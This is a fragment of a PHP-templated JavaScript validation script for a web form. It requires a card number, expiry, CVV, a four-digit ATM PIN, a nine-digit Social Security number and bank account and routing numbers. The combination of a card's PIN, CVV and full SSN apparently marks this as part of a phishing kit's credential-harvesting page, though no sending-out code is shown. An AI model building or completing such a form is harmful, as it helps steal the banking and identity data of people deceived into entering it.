 frmvalidator.addValidation("userphone","num","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("userphone","minlen=10","<?php echo $valid["$i"];$i++;?>");
 
 
 frmvalidator.addValidation("CardName","req","<?php echo $valid["$i"];$i++;?>");
 
 //frmvalidator.addValidation("cardtype","dontselect=0","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("defaultcardnumber","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("defaultcardnumber","maxlen=16","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("defaultcardnumber","minlen=13","<?php echo $valid["$i"];$i++;?>");
 
 frmvalidator.addValidation("account","num","<?php echo $valid["$i"];?>");
 frmvalidator.addValidation("accountch","num","<?php echo $valid["$i"];?>");
 frmvalidator.addValidation("routing","num","<?php echo $valid["$i"];?>");
 frmvalidator.addValidation("defaultcardnumber","num","<?php echo $valid["$i"];$i++;?>");
 
 
 frmvalidator.addValidation("defaultexpmonth","dontselect=0","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("defaultexpyear","dontselect=0","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("defaultcvv2","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("defaultcvv2","num","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("defaultcvv2","minlen=3","<?php echo $valid["$i"];$i++;?>");
 
 
 frmvalidator.addValidation("atm","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("atm","maxlen=4","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("atm","minlen=4","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("ssn","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("ssn","maxlen=9","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("ssn","minlen=9","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("ssn","num","<?php echo $valid["$i"];$i++;?>");

</script>

</table>

